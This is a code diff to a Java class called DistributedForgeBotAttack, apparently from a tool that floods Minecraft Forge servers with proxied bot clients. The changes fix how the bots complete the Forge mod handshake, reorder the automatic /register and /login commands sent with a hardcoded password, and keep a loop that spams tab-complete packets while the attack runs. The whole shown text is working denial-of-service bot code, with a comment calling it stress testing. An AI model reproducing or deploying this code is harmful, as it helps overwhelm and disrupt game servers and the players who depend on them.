@@ -39,6 +39,7 @@ public class DistributedForgeBotAttack extends Util {
     private boolean lele;
     private Map<String,String> modlist;
     private static byte[] reg;
+    private static boolean _3 = false;
 
 
     public DistributedForgeBotAttack(String ip, int port, long time, int sleepTime, Map<String, Proxy.Type> ips, boolean tab, boolean lele,Map<String,String> modlist) {
@@ -140,10 +141,12 @@ public class DistributedForgeBotAttack extends Util {
                     //SendACK
                     if (((ServerPluginMessagePacket) packetReceivedEvent.getPacket()).getChannel().equals("FML|HS") && data.length > 1 && ((byte) 2) == data[0]) {
                         client.getSession().send(new ClientPluginMessagePacket("FML|HS", new byte[]{(byte) -1, 0x02}));
+                        _3=true;
                     }
                     //Read RegistryData
-                    if (((ServerPluginMessagePacket) packetReceivedEvent.getPacket()).getChannel().equals("FORGE") && data.length > 1 && ((byte) 2) == data[0]) {
+                    if (_3) {
                         client.getSession().send(new ClientPluginMessagePacket("FML|HS", new byte[]{(byte) -1, 0x03}));
+                        _3=false;
                     }
                     if (((ServerPluginMessagePacket) packetReceivedEvent.getPacket()).getChannel().equals("REGISTER")) {
                         reg = ((ServerPluginMessagePacket) packetReceivedEvent.getPacket()).getData();
@@ -153,13 +156,6 @@ public class DistributedForgeBotAttack extends Util {
 
                     new Thread(() -> {
                         client.getSession().send(new ClientChatPacket("/register qwqovo8898 qwqovo8898"));
-                        try {
-                            Thread.sleep(2000);
-                        } catch (InterruptedException e) {
-                            e.printStackTrace();
-                        }
-                        client.getSession().send(new ClientChatPacket("/login qwqovo8898"));
-                        //TAB压测
                         if (tab) {
                             while (isAttack) {
                                 client.getSession().send(new ClientTabCompletePacket("/"));
@@ -170,6 +166,14 @@ public class DistributedForgeBotAttack extends Util {
                                 }
                             }
                         }
+                        try {
+                            Thread.sleep(1300);
+                        } catch (InterruptedException e) {
+                            e.printStackTrace();
+                        }
+                        client.getSession().send(new ClientChatPacket("/login qwqovo8898"));
+                        //TAB压测
+
                     }).start();
 
                 }
